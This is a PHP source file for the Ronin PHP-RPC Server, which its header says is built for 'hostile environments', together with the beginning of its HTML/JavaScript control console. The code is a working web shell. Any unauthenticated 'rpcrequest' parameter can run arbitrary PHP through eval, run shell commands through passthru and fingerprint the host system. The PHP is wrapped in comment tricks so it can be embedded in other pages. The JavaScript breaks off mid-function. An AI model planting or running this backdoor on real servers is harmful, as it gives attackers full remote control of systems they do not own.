// <!-- <?php
/*
 * Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
 *  environments.
 *
 * Copyright (c) 2007-2009
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

/**
 * PHP MsgPack encode/decode
 * http://code.google.com/p/msgpack-php
 * MsgPack: http://msgpack.sourceforge.net/
 *
 * Author: S.Schwuchow http://www.Schottenland.de
 *
 * @TODO check signed int >16bit
 * @TODO raise more warning of php incompatiblities
 * @TODO check float twice
 * @TODO build a big and complex test binaryString from other implementation and test against it
 *
 *
 */
class MsgPack_Coder {

	// fixed length
	const VALUE_SCALAR_NULL = 192; // xC0
	const VALUE_SCALAR_FALSE = 194; // xC2
	const VALUE_SCALAR_TRUE = 195; // xC3
	const VALUE_SCALAR_FLOAT = 202; // xCA
	const VALUE_SCALAR_DOUBLE = 203; // xCB
	// x00-x7f - integer 0-127 positive fixnum
	const VALUE_INT_FIX_NEGATIVE = 224; // 111XXXXX xE0-xFF -1 - -32 // unclear 11100000 = -1 ??
	const VALUE_INT_UNSIGNED_8 = 204; // xCC + 1 byte
	const VALUE_INT_UNSIGNED_16 = 205; // xCD + 2 byte
	const VALUE_INT_UNSIGNED_32 = 206; // xCE + 4 byte
	const VALUE_INT_UNSIGNED_64 = 207; // xCF + 8 byte
	const VALUE_INT_SIGNED_8 = 208; // xD0 + 1 byte
	const VALUE_INT_SIGNED_16 = 209; // xD1 + 2 byte
	const VALUE_INT_SIGNED_32 = 210; // xD2 + 4 byte
	const VALUE_INT_SIGNED_64 = 211; // xD3 + 8 byte
	// raw bytes
	const VALUE_RAW_FIX = 160; // xA0 101XXXXX + max 31 byte len
	const VALUE_RAW_16 = 218; // xDA save raw bytes up to (2^16)-1 bytes.
	const VALUE_RAW_32 = 219; // xDB save raw bytes up to (2^32)-1 bytes.
	// container
	const VALUE_LIST_FIX = 144; // x90 1001XXXX save an array up to 15 elements. 
	const VALUE_LIST_16 = 220; // xDC save an array up to (2^16)-1 elements. 
	const VALUE_LIST_32 = 221; // xDD save an array up to (2^32)-1 elements. 
	const VALUE_MAP_FIX = 128; // x80 1000XXXX save a map up to 15 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_16 = 222; // xDE save a map up to (2^16)-1 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_32 = 223; // xDF save a map up to (2^32)-1 elements. odd elements are key and next element of the key is its associate value.

	/**
	 * encode a PHP-Variable to binary MsgPack String
	 *
	 * @static
	 * @param mixed $message
	 * @return string
	 */
	static public function encode($message) {
		$messagePack = null;
		if( $message===null ) {
			$messagePack.= chr(self::VALUE_SCALAR_NULL);
		} elseif( $message===true ) {
			$messagePack.= chr(self::VALUE_SCALAR_TRUE);
		} elseif( $message===false ) {
			$messagePack.= chr(self::VALUE_SCALAR_FALSE);
		} elseif( is_double($message) ) {
			$binary = pack("d", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_float($message) ) {
			// it look like a float is always a double...
			$binary = pack("f", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_int($message) ) {
			if( $message<0 ) {
				if( $message>=-32 ) {
					$messagePack.= pack('c',$message);
				} elseif( $message>=-128 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_8);
					$messagePack.= pack('c',$message); // signed char
				} elseif( $message>=-65535 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_16);
					$messagePack.= self::getNibblesFromInt(65536+$message, 2); // FF FF = -1
				} elseif( $message>=-pow(2,32)-1 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_32);
					$messagePack.= self::getNibblesFromInt(abs($message), 4);
				} else {
					$messagePack.= chr(self::VALUE_INT_SIGNED_64);
					$messagePack.= self::getNibblesFromInt(abs($message), 8);
				}
			} elseif( $message<=127 ) {
				$messagePack.= chr($message);
			} elseif( $message<=255 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_8);
				$messagePack.= self::getNibblesFromInt($message, 1);
			} elseif( $message<=65535 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_16);
				$messagePack.= self::getNibblesFromInt($message, 2);
			} elseif( $message<=pow(2,32)-1 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_32);
				$messagePack.= self::getNibblesFromInt($message, 4);
			} else {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_64);
				$messagePack.= self::getNibblesFromInt($message, 8);
			}
		} elseif( is_string($message) ) {
			$len = strlen($message);
			if( $len<=31 ) {
				$messagePack.= chr(self::VALUE_RAW_FIX+$len);
			} elseif( $len<=65535 ) { // 2^16-1
				$messagePack.= chr(self::VALUE_RAW_16);
				$messagePack.= self::getNibblesFromInt($len, 2);
			} else {
				$messagePack.= chr(self::VALUE_RAW_32);
				$messagePack.= self::getNibblesFromInt($len, 4);
			}
			$messagePack.= $message;
		} elseif( is_array($message) ) {
			$assoc = false;
			$index = 0;
			foreach( $message as $key=>$value ) {
				if( $key!=$index++ ) { // key ist nicht index
					$assoc = true;
					break;
				}
			}
			$count = count($message);
			if( $count<=15 ) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_FIX+$count);
				} else {
					$messagePack.= chr(self::VALUE_LIST_FIX+$count);
				}
			} elseif( $count<65536) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_16);
				} else {
					$messagePack.= chr(self::VALUE_LIST_16);
				}
				$messagePack.= self::getNibblesFromInt($count, 2);
			} else {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_32);
				} else {
					$messagePack.= chr(self::VALUE_LIST_32);
				}
				$messagePack.= self::getNibblesFromInt($count, 4);
			}
			foreach( $message as $key=>$value ) {
				if( $assoc ) {
					$messagePack.= self::encode($key);
				}
				$messagePack.= self::encode($value);
			}
		} else {
			$messagePack = 'encoding failed! messagepack:'.$messagePack;
		}
		return $messagePack;
	}



	/**
	 * decode a MsgPack to php-Variable
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @return mixed
	 */
	static public function decode(&$messagePack) {
		$message = null;
		$messageByte = ord(substr($messagePack,0,1));
		$messagePack = substr($messagePack,1);
		if( $messageByte==self::VALUE_SCALAR_NULL ) {
			$message = null;
		} elseif( $messageByte==self::VALUE_SCALAR_TRUE ) {
			$message = true;
		} elseif( $messageByte==self::VALUE_SCALAR_FALSE ) {
			$message = false;
		} elseif( $messageByte==self::VALUE_SCALAR_DOUBLE ) {
			$unpack = unpack('d', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 8);
		} elseif( $messageByte==self::VALUE_SCALAR_FLOAT ) {
			// it seem that unpack('f'... returns a double, so the result can be different from source e.g. for 1.3 (float) = 1.29999995232 (double)
			$unpack = unpack('f', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 4);
		} elseif( $messageByte<=127 ) {
			$message = $messageByte;
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_8 ) {
			$message = self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_16 ) {
			$message = self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_32 ) {
			$message = self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_64 ) {
			$message = self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_INT_FIX_NEGATIVE AND $messageByte<=self::VALUE_INT_FIX_NEGATIVE+31) {
			$message = -256+$messageByte;
		} elseif( $messageByte==self::VALUE_INT_SIGNED_8 ) {
			$message = -256+self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_16 ) {
			$message = -65536+self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_32 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_64 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_RAW_FIX AND $messageByte<=self::VALUE_RAW_FIX+31) {
			$len = $messageByte-self::VALUE_RAW_FIX;
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_16 ) {
			$len = self::getIntFromMessagePack($messagePack,2);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_32 ) {
			$len = self::getIntFromMessagePack($messagePack,4);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte>=self::VALUE_LIST_FIX AND $messageByte<=self::VALUE_LIST_FIX+15) {
			$count = $messageByte-self::VALUE_LIST_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, false);
		} elseif( $messageByte>=self::VALUE_MAP_FIX AND $messageByte<=self::VALUE_MAP_FIX+15) {
			$count = $messageByte-self::VALUE_MAP_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, true);
		} elseif( $messageByte==self::VALUE_LIST_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_LIST_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_MAP_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} elseif( $messageByte==self::VALUE_MAP_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} else {
			$message = 'resolve Failed';
		}
		return $message;
	}

	/**
	 * dump a binary String for debugging
	 * @static
	 * @param string $messagePack
	 * @return string
	 */
	static public function hexDump($messagePack) {
		$out = '';
		for($i=0; $i<strlen($messagePack); $i++) {
			$out.= ' '.dechex(ord($messagePack[$i]));
		}
		return $out;
	}

	/**
	 * build binary Nibbles for PHP-int
	 * @static
	 * @param int $value
	 * @param int $len
	 * @return string
	 */
	static protected function getNibblesFromInt($intValue, $len) {
		$result = '';
		for($i=1; $i<=$len; $i++ ) {
			$result = chr($intValue % 256).$result;
			$intValue = $intValue/256;
		}
		return $result;
	}
	/**
	 * get an PHP-Int from binary String
	 * the affected bytes will by removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $len
	 * @return int
	 */
	static protected function getIntFromMessagePack(&$messagePack, $len) {
		$int = 0;
		for($i=0; $i<$len; $i++ ) {
			$int += ord(substr($messagePack,$len-1-$i,1)) * pow(2,$i*8);
		}
		$messagePack = substr($messagePack,$len);
		return $int;
	}

	/**
	 * get an PHP-Array from binary string
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $count
	 * @param bool $assoc
	 * @return array
	 */
#segfault	static protected function getArrayFromMessagesPack(string &$messagePack, int $count, boolean $assoc) {
	static protected function getArrayFromMessagesPack(&$messagePack, $count, $assoc) {
		$message = array();
		for( $i=0; $i<$count; $i++ ) {
			if( $assoc ) {
				$message[self::decode($messagePack)] = self::decode($messagePack);
			} else {
				$message[] = self::decode($messagePack);
			}
		}
		return $message;
	}

}

class RPCServer
{
  var $methods;

  var $services;

  function RPCServer()
  {
    $this->methods = array();
    $this->services = array();
  }

  function error_msg($message)
  {
    return array(
      'type' => 'error',
      'message' => $message
    );
  }

  function return_msg($state,$output,$return_value)
  {
    return array(
      'type' => 'return',
      'state' => $state,
      'output' => $output,
      'return_value' => $return_value,
    );
  }

  function load_state($state)
  {
    foreach ($state as $name => $values)
    {
      if (isset($this->services[$name]))
      {
        foreach ($this->services[$name]->persistant as $var)
        {
          if (isset($values[$var]))
          {
            $this->services[$name]->$var = $values[$var];
          }
        }
      }
    }
  }

  function register_method($name,$function)
  {
    $this->methods[$name] = $function;
  }

  function register_service($name,&$service)
  {
    $this->services[$name] =& $service;

    foreach ($service->methods as $rpc_name => $method)
    {
      $this->register_method("{$name}.{$rpc_name}",array(&$service, $method));
    }
  }

  function call_method($request)
  {
    if (!is_array($request))
    {
      return $this->error_msg("Invalid Request message");
    }

    if (!$request['name'])
    {
      return $this->error_msg("Invalid Method Call");
    }

    $method_name = $request['name'];

    if (!$this->methods[$method_name])
    {
      return $this->error_msg("Unknown method: {$method_name}");
    }

    $state = $request['state'];

    if ($state)
    {
      $this->load_state($state);
    }

    $func = $this->methods[$method_name];
    $arguments = $request['arguments'];

    if (!$arguments)
    {
      $arguments = array();
    }

    ob_start();

    $return_value = call_user_func_array($func,$arguments);

    $output = ob_get_contents();
    ob_end_flush();

    $updated_state = $this->save_state();

    return $this->return_msg($updated_state,$output,$return_value);
  }

  function rpc_services($method)
  {
    return array_keys($this->services);
  }

  function save_state()
  {
    $state = array();

    foreach ($this->services as $name => $service)
    {
      $state[$name] = array();

      foreach ($service->persistant as $var)
      {
        $state[$name][$var] = $service->$var;
      }
    }

    return $state;
  }
}

class Service
{
  var $methods;

  var $persistant;

  function Service()
  {
    $this->methods = array();
    $this->persistant = array();
  }

  function is_windows()
  {
    return substr(PHP_OS, 0, 3) == 'WIN';
  }
}

class ConsoleService extends Service
{
  var $includes;

  function ConsoleService()
  {
    $this->includes = array();
    $this->methods = array(
      'invoke' => 'rpc_invoke',
      'eval' => 'rpc_eval',
      'inspect' => 'rpc_inspect'
    );

    $this->persistant = array('includes');
  }

  function rpc_invoke($name,$arguments)
  {
    $call_arguments = array();

    if ($arguments != null)
    {
      foreach(array_keys($arguments) as $index)
      {
        $call_arguments[$index] = "\$arguments[{$index}]";
      }
    }

    $call_string = "return {$name}(" . join(", ", $call_arguments) . ");";

    $ret = eval($call_string);

    if (($name == 'include' || $name == 'require') && $ret != false)
    {
      $this->includes[] = $arguments[0];
    }

    return $ret;
  }

  function rpc_eval($code)
  {
    if ($code[strlen($code) - 1] != ';')
    {
      $code .= ';';
    }

    return eval('return ' . $code);
  }

  function rpc_inspect($code)
  {
    $ret = $this->rpc_eval($code);

    ob_start();
    print_r($ret);
    $output = ob_get_contents();
    ob_end_clean();

    return $output;
  }
}

class ShellService extends Service
{
  var $cwd;

  var $env;

  function ShellService()
  {
    $this->cwd = getcwd();
    $this->env = array();

    $this->methods = array(
      'exec' => 'rpc_exec',
      'cd' => 'rpc_cd',
      'cwd' => 'rpc_cwd',
      'env' => 'rpc_env',
      'getenv' => 'rpc_getenv',
      'setenv' => 'rpc_setenv'
    );

    $this->persistant = array('cwd', 'env');
  }

  function format($obj)
  {
    if (is_array($obj))
    {
      $formatted = array();

      foreach($obj as $value)
      {
        $formatted[] = $this->format($value);
      }

      return join(' ', $formatted);
    }
    else if ($obj == null)
    {
      return '';
    }

    return "{$obj}";
  }

  function exec_output($command)
  {
    ob_start();

    passthru($command);

    $output = ob_get_contents();
    ob_end_clean();

    return split("\n",rtrim($output,"\n\r"));
  }

  function load_env()
  {
    if ($this->is_windows())
    {
      $command = 'set';
    }
    else
    {
      $command = 'env';
    }

    $this->env = array();

    foreach ($this->exec_output($command) as $line)
    {
      list($name, $value) = explode('=', $line, 2);
      $this->env[$name] = $value;
    }
  }

  function rpc_cwd()
  {
    return $this->cwd;
  }

  function rpc_cd($new_cwd)
  {
    if ($new_cwd[0] != DIRECTORY_SEPARATOR)
    {
      $new_cwd = $this->cwd . DIRECTORY_SEPARATOR . $new_cwd;
    }

    $new_cwd = realpath($new_cwd);

    if (file_exists($new_cwd))
    {
      $this->cwd = $new_cwd;
      return true;
    }

    return false;
  }

  function rpc_env()
  {
    return $this->env;
  }

  function rpc_getenv($key)
  {
    return $this->env[$key];
  }

  function rpc_setenv($key,$value)
  {
    return $this->env[$key] = $value;
  }

  function rpc_exec($program,$arguments=array())
  {
    $command = "cd {$this->cwd}; {$program}";

    if (count($arguments) > 0)
    {
      $command .= ' ' . $this->format($arguments);
    }

    $command .= '; pwd';

    $output = $this->exec_output($command);
    $this->cwd = array_pop($output);

    $output_string = '';

    foreach ($output as $line)
    {
      $output_string .= "{$line}\n";
    }

    return $output_string;
  }
}

function running($params=array())
{
  return true;
}

function fingerprint($params=array())
{
  $profile = array(
    'os' => PHP_OS,
    'system_name' => php_uname('s'),
    'system_release' => php_uname('r'),
    'system_version' => php_uname('v'),
    'machine_type' => php_uname('m'),
    'host_name' => php_uname('n'),
    'php' => array(
      'prefix' => PHP_PREFIX,
      'bindir' => PHP_BINDIR,
      'config_dir' => PHP_CONFIG_FILE_SCAN_DIR,
      'datadir' => PHP_DATADIR,
      'extdir' => PHP_EXTENSION_DIR,
      'libdir' => PHP_LIBDIR,
      'lib_suffix' => PHP_SHLIB_SUFFIX,
      'loaded_exts' => get_loaded_extensions(),
      'server_api' => PHP_SAPI,
      'version' => array(
        'id' => PHP_VERSION_ID,
        'string' => PHP_VERSION,
        'major' => PHP_MAJOR_VERSION,
        'minor' => PHP_MINOR_VERSION,
        'release' => PHP_RELEASE_VERSION,
        'extra' => PHP_EXTRA_VERSION,
      )
    ),
    'cwd' => getcwd(),
    'disk_free_space' => disk_free_space('/'),
    'disk_total_space' => disk_total_space('/')
  );

  if (function_exists('posix_getuid'))
  {
    $profile['uid'] = posix_getuid();
  }

  if (function_exists('posix_getgid'))
  {
    $profile['gid'] = posix_getgid();
  }

  if (function_exists('php_ini_loaded_file'))
  {
    $profile['php']['loaded_ini_file'] = php_ini_loaded_file();
  }

  if (function_exists('php_ini_scanned_files'))
  {
    $profile['php']['ini_files'] = split(',',php_ini_scanned_files());
  }

  switch ($profile['php']['server_api'])
  {
  case 'apache':
    $profile['apache_version'] = apache_get_version();
    break;
  }

  return $profile;
}



if (isset($_REQUEST['rpcrequest']))
{
  $server = new RPCServer();
  $server->register_method('running', 'running');
  $server->register_method('fingerprint', 'fingerprint');
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $request = $_REQUEST['rpcrequest'];
  $call = MsgPack_Coder::decode(base64_decode(rawurldecode($request)));
  $return_value = $server->call_method($call);
  $response = base64_encode(MsgPack_Coder::encode($return_value));

  echo("<rpc-response>{$response}</rpc-response>");
  exit;
}
// ?> -->

<html>
  <head>
    <title>Ronin::PHP - AJAX PHP-RPC Console</title>
    <style type="text/css">#console_container{float:left;margin:0 20% 0 20%;padding:1em;width:60%;z-index:10000;background-color:white;color:black;font-family:Helvetica;font-size:.8em;}#console_title{font-weight:bold;}#console_content{background-color:black;}.ui-tabs-hide{display:none;}.ui-tabs-nav{float:right;margin:0;padding:.5em 0 0 .5em;list-style:none;}.ui-tabs-nav:after{display:block;clear:both;content:" ";}.ui-tabs-nav li{float:left;margin:0 0 0 2px;font-weight:bold;}.ui-tabs-nav a{float:left;margin-left:1em;margin-right:1em;color:white;text-decoration:none;}.ui-tabs-nav a span{float:left;}.ui-tabs-nav .ui-tabs-selected a{text-decoration:underline;border-bottom:2px solid white;}div.console_tab{clear:right;margin:0;padding:0 1em 1em 1em;}div.console_tab h2{color:white;font-weight:bold;}div.console_tab a{color:white;text-decoration:none;border-bottom:1px dotted gray;}div.console_tab a:hover{color:white;text-decoration:none;border-bottom:1px solid white;}div.console_tab button{color:white;background-color:black;border:2px solid white;}div.console_dialogue{margin:0;padding:1em;background-color:#c3c3c3;}.terminal_textarea{padding:.125em;width:100%;color:white;font-family:monospace;font-size:1.2em;background-color:black;border:2px solid white;}textarea.terminal_textarea{height:auto;margin:0 0 .5em 0;}input.terminal_textarea{margin:.5em 0 0 0;}p.exception{margin:0;padding:.25em .5em;color:white;background-color:red;font-size:1.45em;font-family:Monospace;font-weight:bold;}</style>
    <script type="text/javascript">
base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx==-1){throw"Cannot decode base64";}
return idx;}
base64.decode=function(s){s=""+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length
if(imax==0){return s;}
if(imax%4!=0){throw"Cannot decode base64";}
pads=0
if(s.charAt(imax-1)==base64.PADCHAR){pads=1;if(s.charAt(imax-2)==base64.PADCHAR){pads=2;}
imax-=4;}
var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff));}
switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)
x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break;}
return x.join('');}
base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw"INVALID_CHARACTER_ERR: DOM Exception 5";}
return x;}
base64.encode=function(s){if(arguments.length!=1){throw"SyntaxError: Not enough arguments";}
var padchar=base64.PADCHAR;var alpha=base64.ALPHA;var getbyte=base64.getbyte;var i,b10;var x=[];s=""+s;var imax=s.length-s.length%3;if(s.length==0){return s;}
for(i=0;i<imax;i+=3){b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8)|getbyte(s,i+2);x.push(alpha.charAt(b10>>18));x.push(alpha.charAt((b10>>12)&0x3F));x.push(alpha.charAt((b10>>6)&0x3f));x.push(alpha.charAt(b10&0x3f));}
switch(s.length-imax){case 1:b10=getbyte(s,i)<<16;x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+
padchar+padchar);break;case 2:b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8);x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+
alpha.charAt((b10>>6)&0x3f)+padchar);break;}
return x.join('');}</script>
    <script type="text/javascript">
MessagePack={};MessagePack.unpack=function(data){var unpacker=new MessagePack.Decoder(data);return unpacker.unpack();};MessagePack.UTF8=0;MessagePack.ASCII8bit=1;MessagePack.UTF16=2;MessagePack.ByteArray=-1;MessagePack.CharSet=MessagePack.UTF8;MessagePack.Decoder=function(data,charSet){this.index=0;if(MessagePack.hasVBS){if(typeof(data)=="unknown"){this.length=msgpack_getLength(data);this.byte_array_to_string(data);}else{this.length=msgpack_getLength(data);this.data=data;}}else{this.length=data.length;this.data=data;}
charSet=charSet||MessagePack.CharSet||0;if(charSet=='utf-8'){charSet=MessagePack.UTF8;}
else if(charSet=='ascii'){charSet=MessagePack.ASCII8bit;}
else if(charSet=='utf16'){charSet=MessagePack.UTF16;}
else if(charSet=='byte-array'){charSet=MessagePack.ByteArray;}
else{charSet=MessagePack.UTF8;}}
if(typeof execScript!='undefined'){execScript('Dim g_msgpack_binary_data\n'+'Sub msgpack_set_binary_data(binary)\n'+'    g_msgpack_binary_data = binary\n'+'End Sub\n'+'Function msgpack_getByte(pos)\n'+'  msgpack_getByte = AscB(MidB(g_msgpack_binary_data, pos + 1, 1))\n'+'End Function\n',"VBScript");execScript('Function msgpack_substr(pos, len)\n'+'  Dim array()\n'+'  ReDim array(len)\n'+'  For i = 1 To len\n'+'    array(i-1) = AscB(MidB(g_msgpack_binary_data, pos + i, 1))\n'+'  Next\n'+'  msgpack_substr = array\n'+'End Function\n'+'Function msgpack_getLength(data)\n'+'  msgpack_getLength = LenB(data)\n'+'End Function\n'+'\n','VBScript');}
MessagePack.hasVBS='msgpack_getByte'in this;with({p:MessagePack.Decoder.prototype}){p.unpack=function(){var type=this.unpack_uint8();if(type<0x80){var positive_fixnum=type;return positive_fixnum;}else if((type^0xe0)<0x20){var negative_fixnum=(type^0xe0)-0x20;return negative_fixnum;}
var size;if((size=type^0xa0)<=0x1f){return this.unpack_raw(size);}else if((size=type^0x90)<=0x0f){return this.unpack_array(size);}else if((size=type^0x80)<=0x0f){return this.unpack_map(size);}
switch(type){case 0xc0:return null;case 0xc1:return undefined;case 0xc2:return false;case 0xc3:return true;case 0xca:return this.unpack_float();case 0xcb:return this.unpack_double();case 0xcc:return this.unpack_uint8();case 0xcd:return this.unpack_uint16();case 0xce:return this.unpack_uint32();case 0xcf:return this.unpack_uint64();case 0xd0:return this.unpack_int8();case 0xd1:return this.unpack_int16();case 0xd2:return this.unpack_int32();case 0xd3:return this.unpack_int64();case 0xd4:return undefined;case 0xd5:return undefined;case 0xd6:return undefined;case 0xd7:return undefined;case 0xd8:return undefined;case 0xd9:return undefined;case 0xda:size=this.unpack_uint16();return this.unpack_raw(size);case 0xdb:size=this.unpack_uint32;return this.unpack_raw(size);case 0xdc:size=this.unpack_uint16();return this.unpack_array(size);case 0xdd:size=this.unpack_uint32();return this.unpack_array(size);case 0xde:size=this.unpack_uint16();return this.unpack_map(size);case 0xdf:size=this.unpack_uint32();return this.unpack_map(size);}}
p.unpack_uint8=function(){var byte=this.getc()&0xff;this.index++;return byte;};p.unpack_uint16=function(){var bytes=this.read(2);var uint16=((bytes[0]&0xff)*256)+(bytes[1]&0xff);this.index+=2;return uint16;}
p.unpack_uint32=function(){var bytes=this.read(4);var uint32=((bytes[0]*256+
bytes[1])*256+
bytes[2])*256+
bytes[3];this.index+=4;return uint32;}
p.unpack_uint64=function(){var bytes=this.read(8);var uint64=((((((bytes[0]*256+
bytes[1])*256+
bytes[2])*256+
bytes[3])*256+
bytes[4])*256+
bytes[5])*256+
bytes[6])*256+
bytes[7];this.index+=8;return uint64;}
p.unpack_int8=function(){var uint8=this.unpack_uint8();return(uint8<0x80)?uint8:uint8-(1<<8);};p.unpack_int16=function(){var uint16=this.unpack_uint16();return(uint16<0x8000)?uint16:uint16-(1<<16);}
p.unpack_int32=function(){var uint32=this.unpack_uint32();return(uint32<Math.pow(2,31))?uint32:uint32-Math.pow(2,32);}
p.unpack_int64=function(){var uint64=this.unpack_uint64();return(uint64<Math.pow(2,63))?uint64:uint64-Math.pow(2,64);}
p.unpack_raw=function(size){if(this.length<this.index+size){throw new Error("MessagePackFailure: index is out of range"
+" "+this.index+" "+size+" "+this.length);}
var bytes=this.read(size);this.index+=size;if(this.charSet==MessagePack.ASCII8bit){return String.fromCharCode.apply(String,bytes);}else if(this.charSet==MessagePack.ByteArray){return bytes;}
else{var i=0,str="",c,code;while(i<size){c=bytes[i];if(c<128){str+=String.fromCharCode(c);i++;}
else if((c^0xc0)<32){code=((c^0xc0)<<6)|(bytes[i+1]&63);str+=String.fromCharCode(code);i+=2;}
else{code=((c&15)<<12)|((bytes[i+1]&63)<<6)|(bytes[i+2]&63);str+=String.fromCharCode(code);i+=3;}}
return str;}}
p.unpack_array=function(size){var objects=new Array(size);for(var i=0;i<size;i++){objects[i]=this.unpack();}
return objects;}
p.unpack_map=function(size){var map={};for(var i=0;i<size;i++){var key=this.unpack();var value=this.unpack();map[key]=value;}
return map;}
p.unpack_float=function(){var uint32=this.unpack_uint32();var sign=uint32>>31;var exp=((uint32>>23)&0xff)-127;var fraction=(uint32&0x7fffff)|0x800000;return(sign==0?1:-1)*fraction*Math.pow(2,exp-23);}
p.unpack_double=function(){var h32=this.unpack_uint32();var l32=this.unpack_uint32();var sign=h32>>31;var exp=((h32>>20)&0x7ff)-1023;var hfrac=(h32&0xfffff)|0x100000;var frac=hfrac*Math.pow(2,exp-20)+
l32*Math.pow(2,exp-52);return(sign==0?1:-1)*frac;}
p.byte_array_to_string=function(data){var binary_to_js_array_hex=function(binary){var xmldom=new ActiveXObject("Microsoft.XMLDOM");var bin=xmldom.createElement("bin");bin.nodeTypedValue=data;bin.dataType="bin.hex";var text=bin.text;var size=text.length;return function(start,length){var i=0,chunk=4,bytes=[]
chunk2=chunk*2,hex,int32;for(;i+3<length;i+=4){hex=text.substr(2*(i+start),chunk2);int32=parseInt(hex,16);bytes[i]=(int32>24)&0xff;bytes[i+1]=(int32>16)&0xff;bytes[i+2]=(int32>8)&0xff;bytes[i+3]=int32&0xff;}
for(i-=3;i<length;i++){hex=this.data.substr(2*(i+start),2);bytes[i]=parseInt(hex,16);}
return bytes;}}
